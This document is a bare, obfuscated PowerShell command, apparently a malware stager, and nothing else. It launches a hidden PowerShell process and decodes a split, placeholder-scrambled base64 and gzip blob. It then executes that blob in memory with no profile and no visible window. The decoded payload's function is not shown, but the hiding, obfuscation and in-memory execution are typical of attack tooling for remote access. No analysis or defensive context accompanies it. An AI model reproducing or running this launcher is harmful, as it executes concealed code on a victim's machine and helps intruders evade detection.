if([IntPtr]::Size -eq 4){$b=$env:windir+'\sysnative\WindowsPowerShell\v1.0\powershell.exe'}else{$b='powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4sIAFctu2ECA7{''+''1}X7W/aOBj/Pmn/QzQhE{1''+''}RKQtf2uEqTzoFQwqAjDYQWhk5uYoKH47DEKaS7/e/3OCR90ejd7qT5C''+''7H9vPn3vLJMuSdoxJX4ejxTvr19oxRrhGMcKmrFt0Z1pYI7o9rTXS{1}8MDeO8kFR52iz6UQhpnxxcdFO45hwsd83LolASULCO0ZJotaUv5TpisTk+NPdF+IJ5ZtS+bNxyaI7zAqyrI29F{1}GOEffl3SDysLSs4WwYFWr18+dqbX7cXDTMrylmi{1}p1skSQsOEz{1}q0p32tS4TjbELU6pF4cJdFSNKaUvz9pTHiCl+QKpN2TIRGryE+q8Jqn''+''98REpDEvniXl7KnUKnyO4shDvh+TJKnWlbnUMF8s/lDnhfrrlAsakobFBYmjjUPie+qRp''+''NHD3GfkmiwXwOWImPJgUasB2X20JmqFp4z{1}lf8iRr0i2xK8n2{1}SnzMB1UjEtTo49dBDh5GfMrJnrR6w{1}EZCD{1}YRDQDgd4nhsgwgPsn4gQB6OijXPL8hYLI6ihKaM39Q9LoyBN1YRHEG28o4Tklt8Qi4Ukkpr/+ssGbJCXzMHJAtnM3diPqLJwkvIq''+''DyFfckzevh3CFLykkn4zikXhmx6iGnkCUjOSSNkuwKLFSrxQXxO4SRAAuJsoyNH9jMkIpHXiOlzCcx8''+''sCxC{1}gFPq+9NGbvOL{1}q8SEJAb''+''39HoK1soQ8IS{1}1kRtZq{1}3ugajaZjhJ6soohUT16opDMCN+XUE8ocU{1}SkWUf1afzB2mTFAPJ6IUt6i9RLPQ2o54IuLUA7cCAmNnQzyKmQSkrvSoT4zMoUGpvXoQjjZmDLIHJ''+''N2DO+BEwuAIGSwxGCoDo9ZwiLDCDSMhkORlo8twAEWiSJE8uHBA/OphM8s82Ae9hKXE45mR4GuHRaKuuDQWUIMkxHl0/R8jfqw+0pp2TArXqGWCzY1MyAyoiK0M7RKgHI5YABTdOAoNnJDz032ZUd9pJu2cjTrRA4Jldq9t13CcTs+ZTehgEhrXjiWcSxO+qTEdj3t92GcTMxgJffMR6FDc2a2WyEoss2dkdtNAXo/+5vYt2rQCqlstB/{1}s2+2GwU1w29''+''5ao9WNBYrag8AK4New{1}p6hz/TA0E1nYLeNPvINm+''+''rB7WlzdjX0mKW1mEEfHAvkTKU+2+v1O3gHeszT097Nboyuhn206n7yu82T7sqkOlo7ds+erS8HHTPfe3Jv3yYmNbu3truyQAeZuhtjanZntruxgqNtYLsD7bS7MuDcorvBxtFgNZv9e+4/DFnrYQjm2u6sT8nMCkgWIBsh55Yz527bRmhyhs4MjZvdCZytxxbf2XeboZ/d9rTf3SElmwjZJkJdBikaIrztaM''+''1p9NF2z+yJqe+yib''+''7bml+0rUn723XxO7k8Pw+05elIcx2L9/DKAHuz/uma9o/gLsS''+''ufrvUXIlfe''+''821B37DzvvDHFN4jw08{1}PoLB9fAt+dBgls3muYGWoCWzLW''+''Clh3cRPwEr0H2NEBgIZL40GXfAuyNlNH15OhGa07AHj3s73Rpa9hv''+''gbyT9QGZzgrw9WcYGdIOY3oZoen68rydtUZDeIfbBJncTcfTH''+''sgEm9N1S8IMvu04bX7pWDcn/t21oR35tzgwZo63bLcGU+rea+47iPH5hHLx/mQBmbRxWrIRvH1TEb73LNRfa3NDHCcrzCAFoH2{1}dagbxd2iJY0iKjlUNZ9t1iTmhME4AANDmcGIsciTHTFvXtCN9z1StuyJlZt16KumPBLWnhpleXRxMQMroSRAvjYGhAdi{1}dd373UdOpy+00/z3P/5p7WjTaZKWXXZIiUyhWiWiwZpdKmo6q/HCgYhARX5dbReAw50r6GEQkXf1zUJnxFF7D''+''l4+3c9xsIz6ACzJjx8LkegfYyAgGPyFUCQE8LziaPCu0''+''b/18ZNUZ9X''+''8OP/W9w8nf3D7U/Fkl7P8fnh9OXBs872CxGYYiqA0oFGw8h+8jkMRJErzydJcA+kwrJY8i/Bp1QcX8GAmfe6vwFJrm/2jAwAAA{0}{0}'')-f''='',''V'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);
